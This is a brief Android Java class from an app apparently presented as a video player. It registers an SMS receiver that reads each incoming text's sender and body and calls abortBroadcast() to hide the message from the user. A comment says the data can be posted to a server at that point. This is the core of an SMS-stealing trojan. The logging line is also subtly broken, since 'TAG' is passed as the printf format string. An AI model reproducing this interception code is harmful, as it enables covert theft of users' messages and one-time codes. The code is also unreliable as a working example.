package com.example.videoplayer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Toast.makeText(context, "有新的短信来了...", Toast.LENGTH_SHORT).show();
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for (Object obj : pdus) {
			SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) obj);
//			获取短信的内容
			String body = smsMessage.getMessageBody();
//			获取短信的发件人
			String sender = smsMessage.getOriginatingAddress();
			System.out.printf("TAG", "短信收到了。。。"+"sender:"+sender+";body="+body);
			
			
//			在这里就可以通过get或者post的请求提交到服务武器
			
//			拦截短信
			abortBroadcast();
		}
	}

}
